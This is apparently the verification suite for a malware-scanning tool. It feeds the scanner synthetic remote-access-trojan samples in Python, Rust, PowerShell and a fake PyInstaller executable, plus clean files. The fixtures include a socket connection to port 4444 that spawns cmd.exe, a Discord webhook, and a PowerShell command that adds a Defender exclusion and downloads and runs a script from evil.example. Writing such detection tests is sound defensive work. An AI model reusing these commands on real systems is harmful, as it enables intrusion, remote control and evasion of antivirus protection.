"""
OpcodeShield v4.1.0 — Automated Verification Suite for Any-File RAT Inspection,
Source Code Analysis (Python AST, Rust, PowerShell), and PyInstaller .exe Static Unpacking.
"""

from __future__ import annotations

import base64
import marshal
import struct
import sys
import zlib
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from pyinstaller_inspector import PYINSTALLER_COOKIE, inspect_pyinstaller_binary, inspect_pyinstaller_bytes
from rust_core import get_rust_core
from source_analyzer import analyze_any_bytes, sanitize_source_code


def _build_synthetic_pyinstaller_rat_exe() -> bytes:
    """Build a valid PyInstaller v21 CArchive PE containing a marshaled Python RAT script."""
    rat_src = (
        "import socket, subprocess\n"
        "C2 = 'https://discord.com/api/webhooks/999999/secret_rat'\n"
        "s = socket.socket()\n"
        "s.connect(('198.51.100.77', 4444))\n"
        "subprocess.Popen(['cmd.exe'])\n"
    )
    code_obj = compile(rat_src, "rat_payload.py", "exec")
    marshaled = marshal.dumps(code_obj)
    comp = zlib.compress(marshaled)

    pe_stub = b"MZ" + b"\x00" * 58 + b"\x40\x00\x00\x00PE\x00\x00\x64\x86\x00\x00" + b"\x00" * 64
    # Entry 1: script 'rat_payload' (type 's')
    name1 = b"rat_payload\x00"
    entry1 = struct.pack("!IIIIBB", 18 + len(name1), 0, len(comp), len(marshaled), 1, ord("s")) + name1
    # Entry 2: bundled module 'pynput' (type 'm')
    name2 = b"pynput\x00"
    entry2 = struct.pack("!IIIIBB", 18 + len(name2), 0, 0, 0, 0, ord("m")) + name2
    toc = entry1 + entry2
    toc_offset = len(comp)
    pkg_len = len(comp) + len(toc) + 88
    cookie = struct.pack("!8sIIII64s", PYINSTALLER_COOKIE, pkg_len, toc_offset, len(toc), 313, b"python313.dll")
    return pe_stub + comp + toc + cookie


def main() -> None:
    # 1. Real PyInstaller .exe check (OpcodeShield-CLI.exe)
    real_pyi = Path("dist/OpcodeShield-CLI.exe")
    if real_pyi.exists():
        r_real = inspect_pyinstaller_binary(real_pyi)
        assert r_real["is_pyinstaller"], "Should detect real PyInstaller .exe"
        assert r_real["toc_entry_count"] > 10, f"Expected >10 TOC entries, got {r_real['toc_entry_count']}"
        print(f"[PASS] 1a. Real PyInstaller .exe ({real_pyi.name}: Python {r_real['python_version']}, {r_real['toc_entry_count']} TOC entries, {r_real['pyz_module_count']} PYZ modules)")

    # 1b. PyInstaller RAT .exe static bytecode extraction
    pyi_rat_bytes = _build_synthetic_pyinstaller_rat_exe()
    r_pyi_rat = inspect_pyinstaller_bytes(pyi_rat_bytes, "free_nitro_rat.exe")
    assert r_pyi_rat["is_pyinstaller"] and r_pyi_rat["risk_score"] >= 75, f"Missed PyInstaller RAT: {r_pyi_rat}"
    assert any("discord.com/api/webhooks" in u for u in r_pyi_rat["iocs"]), f"Missed webhook IOC: {r_pyi_rat}"
    assert any("pynput" in m for m in r_pyi_rat["rat_modules_found"]), f"Missed pynput RAT module: {r_pyi_rat}"
    print(f"[PASS] 1b. PyInstaller RAT Bytecode Unpacker (score={r_pyi_rat['risk_score']}, modules={r_pyi_rat['rat_modules_found']}, IOCs={r_pyi_rat['iocs']})")

    # 2. Python Source RAT (AST + surgical disinfection)
    py_rat = (
        "import socket, subprocess, base64, pynput.keyboard\n"
        "print('starting helper')\n"
        "WEBHOOK = 'https://discord.com/api/webhooks/123456/token'\n"
        "exec(base64.b64decode('cHJpbnQoMSk='))\n"
    )
    r_py = analyze_any_bytes(py_rat.encode("utf-8"), "stealer.py")
    assert r_py["type"] == "python" and r_py["risk_score"] >= 75, f"Missed Python RAT: {r_py}"
    cleaned, n_patched = sanitize_source_code(py_rat, r_py["findings"], "python")
    assert n_patched >= 1 and "[OPCODESHIELD NEUTRALIZED]" in cleaned
    print(f"[PASS] 2. Python AST RAT Analyzer & Source Disinfector (score={r_py['risk_score']}, neutralized {n_patched} line(s))")

    # 3. Rust Source RAT
    rs_rat = (
        'use std::net::TcpStream;\nuse std::process::Command;\n'
        'fn main() {\n  let _s = TcpStream::connect("198.51.100.9:4444");\n'
        '  let _c = Command::new("cmd").spawn();\n'
        '  let _f: extern "C" fn() = unsafe { std::mem::transmute(0usize) };\n}\n'
    )
    r_rs = analyze_any_bytes(rs_rat.encode("utf-8"), "implant.rs")
    assert r_rs["type"] == "rust" and r_rs["risk_score"] >= 75, f"Missed Rust RAT: {r_rs}"
    print(f"[PASS] 3. Rust Source RAT Analyzer (score={r_rs['risk_score']}, findings={[f['rule'] for f in r_rs['findings']]})")

    # 4. PowerShell Encoded RAT auto-decoding
    ps_inner = "IEX (New-Object Net.WebClient).DownloadString('https://evil.example/rat.ps1')"
    ps_b64 = base64.b64encode(ps_inner.encode("utf-16le")).decode("ascii")
    ps_script = f"Add-MpPreference -ExclusionPath C:\\\npowershell -enc {ps_b64}\n"
    r_ps = analyze_any_bytes(ps_script.encode("utf-8"), "update.ps1")
    assert r_ps["risk_score"] >= 75 and any("evil.example" in d for d in r_ps["decoded_payloads"]), f"Missed PS1 decode: {r_ps}"
    print(f"[PASS] 4. PowerShell RAT & Base64 Auto-Decoder (score={r_ps['risk_score']}, decoded={r_ps['decoded_payloads'][0][:55]}...)")

    # 5. Clean Python & Clean Rust (0 false positives!)
    r_clean_py = analyze_any_bytes(b"def add(a, b):\n    return a + b\nprint(add(2, 3))\n", "math_utils.py")
    r_clean_rs = analyze_any_bytes(b"fn main() { println!(\"Hello OpcodeShield!\"); }\n", "hello.rs")
    assert r_clean_py["risk_score"] == 0 and r_clean_rs["risk_score"] == 0, f"Clean FP: py={r_clean_py}, rs={r_clean_rs}"
    print("[PASS] 5. Clean Python & Clean Rust Source Files (0 false positives)")

    # 6. Unified Rust Core DLL inspecting Python RAT, Rust RAT, and PyInstaller RAT
    rc = get_rust_core()
    assert rc.available
    rc_py = rc.analyze_bytes(py_rat.encode("utf-8"), "stealer.py")
    rc_rs = rc.analyze_bytes(rs_rat.encode("utf-8"), "implant.rs")
    rc_pyi = rc.analyze_bytes(pyi_rat_bytes, "free_nitro_rat.exe")
    assert rc_py["type"] == "python" and rc_py["risk_score"] >= 75
    assert rc_rs["type"] == "rust" and rc_rs["risk_score"] >= 75
    assert rc_pyi["is_pyinstaller"] and rc_pyi["pyinstaller_pyver"] == "3.13"
    print(f"[PASS] 6. Unified Rust Core DLL (py={rc_py['risk_score']}, rs={rc_rs['risk_score']}, pyinstaller=v{rc_pyi['pyinstaller_pyver']})")

    print("\nALL 6/6 OPCODESHIELD v4.1.0 RAT / SOURCE / PYINSTALLER TESTS PASSED 100%!")


if __name__ == "__main__":
    main()
